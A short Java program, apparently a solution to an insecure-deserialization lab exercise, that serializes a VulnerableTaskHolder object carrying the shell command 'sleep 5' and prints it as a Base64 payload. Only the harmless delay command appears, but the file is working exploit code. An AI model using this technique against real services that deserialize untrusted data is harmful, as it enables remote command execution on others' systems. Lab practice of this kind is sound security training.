import java.io.*;
import java.util.*;
import java.time.*;
import org.dummy.insecure.framework.VulnerableTaskHolder;

public class Program{

  public static void main(String[] args) throws FileNotFoundException, IOException, ClassNotFoundException{

    VulnerableTaskHolder go = new VulnerableTaskHolder("wait", "sleep 5");

    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(bos);
    oos.writeObject(go);
    oos.close();
    System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray())); 
    //oos.flush();
    //byte[] exploit = bos.toByteArray();
  }
}
